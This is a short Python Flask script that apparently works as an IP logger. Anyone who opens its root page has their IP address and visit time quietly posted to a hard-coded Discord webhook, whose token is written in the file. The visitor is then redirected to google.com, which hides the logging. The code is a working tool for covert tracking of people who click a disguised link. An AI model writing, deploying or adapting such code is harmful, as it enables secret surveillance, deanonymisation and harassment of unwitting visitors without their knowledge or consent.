from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)  # ✅ correct usage of __name__

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1389671364117397594/jQhf499StnTMzV3J0s2suuI3_S6D7eHi40UNWJx4dY5eC8oSHUke0657sXN7cWB6Vmnr"
    
    data = {
        "content": None,
        "embeds": [
            {
                "title": "IP Log",
                "description": f"IP: {ip}\nTime: {date}",
                "color": 3447003
            }
        ]
    }
    
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)  # better for proxy/CDN
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    send_ip(ip, date)
    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)  # ✅ specify port
